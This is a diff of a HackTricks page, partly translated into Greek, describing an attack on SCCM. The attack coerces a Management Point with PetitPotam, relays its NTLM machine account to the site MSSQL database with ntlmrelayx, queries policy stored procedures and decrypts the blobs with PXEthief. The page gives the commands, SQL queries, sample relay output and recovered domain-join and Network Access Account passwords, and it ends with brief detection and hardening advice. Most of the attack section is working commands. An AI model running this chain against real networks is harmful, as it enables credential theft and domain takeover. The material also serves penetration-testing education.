@@ -3,33 +3,33 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-Με την πίεση ενός **System Center Configuration Manager (SCCM) Management Point (MP)** να αυθεντικοποιηθεί μέσω SMB/RPC και **αναμεταδίδοντας** αυτόν τον λογαριασμό μηχανής NTLM στη **βάση δεδομένων του ιστότοπου (MSSQL)** αποκτάτε δικαιώματα `smsdbrole_MP` / `smsdbrole_MPUserSvc`.  Αυτοί οι ρόλοι σας επιτρέπουν να καλέσετε ένα σύνολο αποθηκευμένων διαδικασιών που εκθέτουν **Operating System Deployment (OSD)** policy blobs (διαπιστευτήρια Network Access Account, μεταβλητές Task-Sequence, κ.λπ.).  Τα blobs είναι κωδικοποιημένα/κρυπτογραφημένα σε hex αλλά μπορούν να αποκωδικοποιηθούν και να αποκρυπτογραφηθούν με **PXEthief**, αποκαλύπτοντας κείμενα μυστικά.
+Με την πίεση ενός **System Center Configuration Manager (SCCM) Management Point (MP)** να αυθεντικοποιηθεί μέσω SMB/RPC και **αναμεταδίδοντας** αυτόν τον λογαριασμό μηχανής NTLM στη **βάση δεδομένων του ιστότοπου (MSSQL)** αποκτάτε δικαιώματα `smsdbrole_MP` / `smsdbrole_MPUserSvc`.  Αυτοί οι ρόλοι σας επιτρέπουν να καλέσετε ένα σύνολο αποθηκευμένων διαδικασιών που εκθέτουν **Operating System Deployment (OSD)** blobs (διαπιστευτήρια Network Access Account, μεταβλητές Task-Sequence, κ.λπ.).  Τα blobs είναι κωδικοποιημένα/κρυπτογραφημένα σε hex αλλά μπορούν να αποκωδικοποιηθούν και να αποκρυπτογραφηθούν με **PXEthief**, αποκαλύπτοντας κείμενα μυστικά.
 
-High-level chain:
-1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
-2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
-3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, κ.λπ.
-4. Through the SOCKS proxy connect with `mssqlclient.py -windows-auth` as the relayed **<DOMAIN>\\<MP-host>$** account.
-5. Execute:
+Υψηλού επιπέδου αλυσίδα:
+1. Ανακαλύψτε MP & βάση δεδομένων ιστότοπου ↦ μη αυθεντικοποιημένο HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
+2. Ξεκινήστε `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
+3. Πιέστε το MP χρησιμοποιώντας **PetitPotam**, PrinterBug, DFSCoerce, κ.λπ.
+4. Μέσω του SOCKS proxy συνδεθείτε με `mssqlclient.py -windows-auth` ως ο αναμεταδιδόμενος **<DOMAIN>\\<MP-host>$** λογαριασμός.
+5. Εκτελέστε:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
-* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
-6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.
+* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (ή `MP_GetPolicyBodyAfterAuthorization`)
+6. Αφαιρέστε το `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.
 
-Secrets such as `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, κ.λπ. ανακτώνται χωρίς να αγγίξετε PXE ή πελάτες.
+Μυστικά όπως `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, κ.λπ. ανακτώνται χωρίς να αγγίξετε PXE ή πελάτες.
 
 ---
 
-## 1. Enumerating unauthenticated MP endpoints
+## 1. Αριθμητική μη αυθεντικοποιημένων MP endpoints
 Η επέκταση ISAPI του MP **GetAuth.dll** εκθέτει αρκετές παραμέτρους που δεν απαιτούν αυθεντικοποίηση (εκτός αν ο ιστότοπος είναι μόνο PKI):
 
-| Parameter | Purpose |
-|-----------|---------|
-| `MPKEYINFORMATIONMEDIA` | Επιστρέφει το δημόσιο κλειδί πιστοποίησης υπογραφής του ιστότοπου + GUIDs των συσκευών *x86* / *x64* **All Unknown Computers**. |
+| Παράμετρος | Σκοπός |
+|------------|--------|
+| `MPKEYINFORMATIONMEDIA` | Επιστρέφει το δημόσιο κλειδί πιστοποίησης υπογραφής του ιστότοπου + GUIDs των συσκευών **All Unknown Computers** *x86* / *x64*. |
 | `MPLIST` | Λίστα με κάθε Management-Point στον ιστότοπο. |
-| `SITESIGNCERT` | Επιστρέφει το πιστοποιητικό υπογραφής του Primary-Site (αναγνωρίζει τον διακομιστή ιστότοπου χωρίς LDAP). |
+| `SITESIGNCERT` | Επιστρέφει το πιστοποιητικό υπογραφής του Primary-Site (αναγνωρίστε τον διακομιστή ιστότοπου χωρίς LDAP). |
 
-Grab the GUIDs that will act as the **clientID** for later DB queries:
+Αποκτήστε τα GUIDs που θα λειτουργήσουν ως **clientID** για μελλοντικά ερωτήματα DB:
 ```bash
 curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
 ```
@@ -44,7 +44,7 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
 -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-Όταν ενεργοποιηθεί η εξαναγκαστική διαδικασία, θα πρέπει να δείτε κάτι σαν:
+Όταν ενεργοποιείται η εξαναγκαστική διαδικασία, θα πρέπει να δείτε κάτι σαν:
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
@@ -65,7 +65,7 @@ SELECT SMS_Unique_Identifier0
 FROM dbo.UnknownSystem_DISC
 WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```
-### 3.2  Λίστα εκχωρημένων πολιτικών
+### 3.2  Λίστα ανατεθειμένων πολιτικών
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
@@ -74,7 +74,7 @@ EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N''
 Επικεντρωθείτε σε πολιτικές:
 * **NAAConfig**  – Διαπιστευτήρια Λογαριασμού Πρόσβασης Δικτύου
 * **TS_Sequence** – Μεταβλητές Ακολουθίας Εργασιών (OSDJoinAccount/Password)
-* **CollectionSettings** – Μπορεί να περιέχει λογαριασμούς run-as
+* **CollectionSettings** – Μπορεί να περιέχει λογαριασμούς εκτέλεσης
 
 ### 3.3  Ανάκτηση πλήρους σώματος
 Εάν έχετε ήδη `PolicyID` & `PolicyVersion` μπορείτε να παραλείψετε την απαίτηση clientID χρησιμοποιώντας:
@@ -93,7 +93,7 @@ echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
 # Decrypt with PXEthief (7 = decrypt attribute value)
 python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
 ```
-Παράδειγμα ανακτημένων μυστικών:
+Ανακτημένα μυστικά παράδειγμα:
 ```
 OSDJoinAccount : CONTOSO\\joiner
 OSDJoinPassword: SuperSecret2025!
@@ -129,7 +129,7 @@ AND  pe.permission_name='EXECUTE';
 ## 6. Ανίχνευση & Σκληροποίηση
 1. **Παρακολούθηση συνδέσεων MP** – οποιοσδήποτε λογαριασμός υπολογιστή MP που συνδέεται από μια IP που δεν είναι ο οικοδεσπότης του ≈ relay.
 2. Ενεργοποιήστε την **Εκτενή Προστασία για Αυθεντικοποίηση (EPA)** στη βάση δεδομένων του ιστότοπου (`PREVENT-14`).
-3. Απενεργοποιήστε το NTLM που δεν χρησιμοποιείται, επιβάλετε την υπογραφή SMB, περιορίστε το RPC (
+3. Απενεργοποιήστε το μη χρησιμοποιούμενο NTLM, επιβάλετε την υπογραφή SMB, περιορίστε το RPC (
 οι ίδιες μετρήσεις που χρησιμοποιούνται κατά του `PetitPotam`/`PrinterBug`).
 4. Σκληρύνετε την επικοινωνία MP ↔ DB με IPSec / αμοιβαίο TLS.
 
@@ -137,11 +137,13 @@ AND  pe.permission_name='EXECUTE';
 
 ## Δείτε επίσης
 * Βασικές αρχές NTLM relay:
+
 {{#ref}}
 ../ntlm/README.md
 {{#endref}}
 
 * Κατάχρηση MSSQL & μετα-εκμετάλλευση:
+
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
